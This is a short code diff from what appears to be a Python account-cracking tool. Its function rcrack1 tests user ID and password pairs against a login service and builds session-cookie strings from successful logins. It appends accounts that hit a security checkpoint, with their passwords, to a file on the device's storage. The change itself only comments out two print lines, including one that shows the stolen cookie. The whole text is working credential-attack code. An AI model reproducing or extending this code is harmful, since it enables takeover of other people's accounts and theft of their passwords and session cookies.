@@ -283,13 +283,13 @@ def rcrack1(uid,pwx,tl):
                     return 'LOCK'
                 else:
                     print(f"\033[38;5;46m[SHANTO-OK🌻] {uid}|{ps}")
-                    print(f'  \r\033[1;92m  [COOKIE] '+coki)
+                    ##print(f'  \r\033[1;92m  [COOKIE] '+coki)
                 oks.append(uid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[82:97]
-                print(f"\x1b[38;5;196m[SHANTO-CP❌] {uid}|{ps}")
+                ##print(f"\x1b[38;5;196m[SHANTO-CP❌] {uid}|{ps}")
                 open('/sdcard/SHANTO-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(uid)
                 break
